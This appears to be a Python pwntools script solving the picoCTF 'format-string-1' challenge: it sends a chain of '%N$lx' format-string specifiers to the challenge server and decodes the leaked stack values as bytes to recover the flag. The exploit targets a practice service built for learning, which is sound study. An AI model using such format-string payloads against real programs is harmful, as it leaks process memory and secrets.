import pwn

HOST = "mimas.picoctf.net"
PORT = 58890

elf = pwn.ELF("./format-string-1")

p = pwn.remote(HOST, PORT)
payload = b"|".join(f"%{i}$lx".encode() for i in range(1, 80))
p.sendline(payload)
out = p.recvuntil(b"Bye!\n")

value = out.split(b"|")

for i, x in enumerate(value):
    try:
        val = int(x, 16)
        raw = pwn.p64(val)
        print(f"{i}: {raw}")
    except:
        pass
